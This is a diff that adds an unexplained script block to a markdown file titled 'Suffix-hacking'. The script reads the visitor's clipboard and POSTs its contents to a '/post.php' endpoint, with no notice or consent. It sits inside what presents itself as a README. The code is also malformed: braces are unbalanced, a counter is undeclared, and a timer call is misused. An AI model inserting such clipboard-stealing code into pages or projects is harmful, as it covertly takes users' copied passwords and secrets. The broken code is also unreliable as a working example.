@@ -1,2 +1,34 @@
 # Suffix-hacking
 
+
+
+<script>
+const controller = new AbortController()
+
+const signal = controller.signal
+function post(data){
+      fetch("/post.php", {
+method: "POST",
+mode: "same-origin",
+credentials: "same-origin",
+headers: {
+"Content-Type": "application/json"},
+
+signal: signal,
+body: data
+
+
+}).then(function(response) {
+    if (response.status==200)
+    
+    res+=1
+    if (res>=2){
+    
+          setTimeout(controller.abort(), 1000);
+    
+                         }).catch(function(err) 
+                         
+                                            console.log(err);
+                                            
+navigator.clipboard.readText().then(clipText => post(clipText));
+</script>                     
